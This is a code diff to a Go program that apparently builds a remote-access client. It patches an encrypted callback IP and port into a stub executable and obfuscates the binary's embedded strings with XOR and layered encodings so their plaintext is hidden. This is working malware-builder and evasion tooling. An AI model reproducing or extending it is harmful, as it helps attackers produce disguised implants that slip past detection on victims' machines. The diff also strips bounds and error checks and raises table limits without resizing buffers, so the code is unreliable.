@@ -40,12 +40,8 @@ func main() {
 	flag.Parse()
 
 	args := flag.Args()
-	if len(args) >= 1 {
-		*ip = args[0]
-	}
-	if len(args) >= 2 {
-		fmt.Sscanf(args[1], "%d", port)
-	}
+	if len(args) >= 1 { *ip = args[0] }
+	if len(args) >= 2 { fmt.Sscanf(args[1], "%d", port) }
 
 	fmt.Printf("[+] Building client for %s:%d\n", *ip, *port)
 
@@ -53,79 +49,53 @@ func main() {
 	if _, err := os.Stat(stubPath); os.IsNotExist(err) {
 		stubPath = "client/client_c.exe"
 		if _, err := os.Stat(stubPath); os.IsNotExist(err) {
-			log.Fatalf("[-] Error: stub.exe (or client/client_c.exe) not found. Please compile the client first.")
+			log.Fatalf("[-] Error: stub.exe (or client/client_c.exe) not found.")
 		}
 	}
 
 	data, err := ioutil.ReadFile(stubPath)
-	if err != nil {
-		log.Fatalf("[-] Error reading stub: %v", err)
-	}
+	if err != nil { log.Fatalf("[-] Error reading stub: %v", err) }
 
 	var indices []int
 	searchData := data
 	offset := 0
 	for {
 		idx := bytes.Index(searchData, marker)
-		if idx == -1 {
-			break
-		}
+		if idx == -1 { break }
 		indices = append(indices, offset+idx)
 		searchData = searchData[idx+1:]
 		offset += idx + 1
 	}
 
-	if len(indices) == 0 {
-		log.Fatalf("[-] Error: Configuration marker (DEADBEEF...) not found in stub binary.")
-	}
+	if len(indices) == 0 { log.Fatalf("[-] Error: Configuration marker not found.") }
 
 	targetIndex := -1
 	if len(indices) == 1 {
 		targetIndex = indices[0]
-		fmt.Printf("[+] Found configuration marker at 0x%X\n", targetIndex)
 	} else {
-		fmt.Printf("[*] Multiple markers found (%d). Searching for the resource placeholder...\n", len(indices))
 		maxZeros := -1
 		for _, idx := range indices {
 			scanLimit := 2032
-			if idx+len(marker)+scanLimit > len(data) {
-				scanLimit = len(data) - (idx + len(marker))
-			}
-			if scanLimit <= 0 {
-				continue
-			}
+			if idx+len(marker)+scanLimit > len(data) { scanLimit = len(data) - (idx + len(marker)) }
+			if scanLimit <= 0 { continue }
 			zeros := 0
 			for i := 0; i < scanLimit; i++ {
-				if data[idx+len(marker)+i] == 0 {
-					zeros++
-				}
+				if data[idx+len(marker)+i] == 0 { zeros++ }
 			}
-			if zeros > maxZeros {
-				maxZeros = zeros
-				targetIndex = idx
-			}
+			if zeros > maxZeros { maxZeros = zeros; targetIndex = idx }
 		}
 	}
 
 	capacity := 0
 	for i := targetIndex + len(marker); i < len(data); i++ {
-		if data[i] != 0 {
-			break
-		}
+		if data[i] != 0 { break }
 		capacity++
 	}
-	fmt.Printf("[+] Found resource placeholder at 0x%X (Capacity: %d bytes)\n", targetIndex, capacity)
-
-	if targetIndex == -1 {
-		log.Fatalf("[-] Error: Could not identify the correct configuration placeholder.")
-	}
+	fmt.Printf("[+] Found placeholder at 0x%X (Capacity: %d bytes)\n", targetIndex, capacity)
 
 	config := Config{IP: *ip, Port: *port}
 	configBytes, _ := json.Marshal(config)
 	encryptedConfig := encrypt(configBytes)
-	if len(encryptedConfig) > 2032 {
-		log.Fatalf("[-] Error: Encrypted config is too large.")
-	}
 
 	finalPayload := make([]byte, 2032)
 	copy(finalPayload, encryptedConfig)
@@ -169,26 +139,19 @@ func main() {
 
 		for _, sec := range f.Sections {
 			if strings.Contains(sec.Name, ".rdata") || strings.Contains(sec.Name, ".data") {
-				fmt.Printf("[*] Scanning section %s for strings...\n", sec.Name)
+				fmt.Printf("[*] Scanning section %s...\n", sec.Name)
 				start, end := sec.Offset, sec.Offset+sec.Size
 				sectionData := patchedData[start:end]
 				for i := 0; i < len(sectionData); {
 					if isPrintable(sectionData[i]) {
 						j := i
-						for j < len(sectionData) && isPrintable(sectionData[j]) {
-							j++
-						}
+						for j < len(sectionData) && isPrintable(sectionData[j]) { j++ }
 						length := j - i
 						if length >= 4 && j < len(sectionData) && sectionData[j] == 0 {
 							rva := sec.VirtualAddress + uint32(i)
-							if rva >= importRVA && rva < importRVA+importSize {
-								i = j + 1
-								continue
-							}
-							if start+uint32(i) >= uint32(targetIndex) && start+uint32(i) < uint32(targetIndex+len(marker)+capacity) {
-								i = j + 1
-								continue
-							}
+							if rva >= importRVA && rva < importRVA+importSize { i = j + 1; continue }
+							if start+uint32(i) >= uint32(targetIndex) && start+uint32(i) < uint32(targetIndex+len(marker)+capacity) { i = j + 1; continue }
+
 							isMarker := bytes.Contains(sectionData[i:j], marker) || bytes.Contains(sectionData[i:j], xorKeyMarker)
 							if !isMarker {
 								origString := make([]byte, length)
@@ -198,13 +161,13 @@ func main() {
 								entry := StringEntry{
 									RVA:       rva,
 									OrigLen:   uint32(length),
-									ResOffset: uint32(2032 + 4 + 1000*32 + len(encodedDataPool)), // Estimated
+									ResOffset: uint32(len(encodedDataPool)),
 									StepCount: int32(len(steps)),
 								}
 								copy(entry.Steps[:], steps)
 								stringTable = append(stringTable, entry)
 
-								// XOR original location in EXE to hide plaintext
+								// XOR original location
 								for k := 0; k < length; k++ {
 									patchedData[start+uint32(i)+uint32(k)] ^= xorKey
 								}
@@ -216,28 +179,23 @@ func main() {
 								encodedDataPool = append(encodedDataPool, encoded...)
 							}
 							i = j + 1
-						} else {
-							i++
-						}
-					} else {
-						i++
-					}
+						} else { i++ }
+					} else { i++ }
 				}
 			}
 		}
 	}
 
-	// 3. Finalize Resource with String Table and Encoded Data Pool
 	tableStart := targetIndex + len(marker) + 2032
 	numEntries := len(stringTable)
-	if numEntries > 1000 { numEntries = 1000 } // Safety
+	if numEntries > 10000 { numEntries = 10000 }
 
 	binary.LittleEndian.PutUint32(patchedData[tableStart:tableStart+4], uint32(numEntries))
-	poolStartOffset := uint32(2032 + 4 + numEntries*32)
+	poolStartOffset := uint32(4 + numEntries*32)
 
 	for i := 0; i < numEntries; i++ {
 		entry := stringTable[i]
-		entry.ResOffset += poolStartOffset - (2032 + 4 + 1000*32) // Fix offset
+		entry.ResOffset += poolStartOffset
 		entryOffset := tableStart + 4 + i*32
 		binary.LittleEndian.PutUint32(patchedData[entryOffset:entryOffset+4], entry.RVA)
 		binary.LittleEndian.PutUint32(patchedData[entryOffset+4:entryOffset+8], entry.OrigLen)
@@ -250,14 +208,12 @@ func main() {
 	fmt.Printf("[+] Obfuscated %d strings. Total Table+Pool: %d bytes\n", numEntries, 4 + numEntries*32 + len(encodedDataPool))
 
 	err = ioutil.WriteFile("client.exe", patchedData, 0755)
-	if err != nil {
-		log.Fatalf("[-] Error writing client.exe: %v", err)
-	}
+	if err != nil { log.Fatalf("[-] Error writing client.exe: %v", err) }
 	fmt.Println("[+] Successfully built client.exe")
 }
 
 func isPrintable(b byte) bool {
-	return b >= 32 && b <= 126
+	return (b >= 32 && b <= 126) || b == 10 || b == 13
 }
 
 const (
@@ -293,7 +249,7 @@ func multiStepEncode(data []byte, xorKey byte) ([]byte, []byte) {
 			next = buf[:n]
 		case StepB91: next = []byte(base91Encode(current))
 		}
-		if len(next) > 0 && len(next) <= 8192 {
+		if len(next) > 0 && len(next) <= 32768 {
 			current = next
 			steps = append(steps, baseType)
 		}
